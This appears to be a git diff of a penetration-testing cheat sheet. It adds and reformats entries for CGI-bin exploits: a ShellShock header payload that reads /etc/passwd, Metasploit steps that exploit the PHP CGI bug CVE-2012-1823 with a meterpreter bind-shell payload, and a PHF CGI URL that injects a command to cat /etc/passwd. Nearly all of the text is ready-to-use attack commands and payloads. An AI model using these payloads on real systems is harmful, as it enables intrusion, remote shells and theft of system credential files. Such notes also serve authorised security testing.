@@ -42,8 +42,15 @@ sqlmap -r sqlmap_request2 -p txtLoginID
 ```
 
 ## PHP CGI-Bin Exploits
+
+**Exploiting ShellShock via CGI-Bin**
+![Shell Shock via User-Agent Header](./img/SHELL_SHOCK.png)
 ```
-# Detecting / Explout PHP CGI Bug - [CVE-2012-1823]
+() { :;}; echo $(</etc/passwd)
+```
+
+**Detect / Exploit PHP CGI Bug - [CVE-2012-1823]**
+```
 nmap -p80 --script http-cve2012-1823
 msf> use exploit/multi/http/php_cgi_arg_injection
 msf> set rhost [HOST_IP]
@@ -51,8 +58,8 @@ msf> set PAYLOAD php/meterpreter/bind_tcp
 msf> exploit
 ```
 
+**PHF CGI Remote Command Execution - [CVE-1999-0067]**
 ```
-# PHF CGI Remote Command Execution - [CVE-1999-0067]
 http://www.thesite.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
 
 
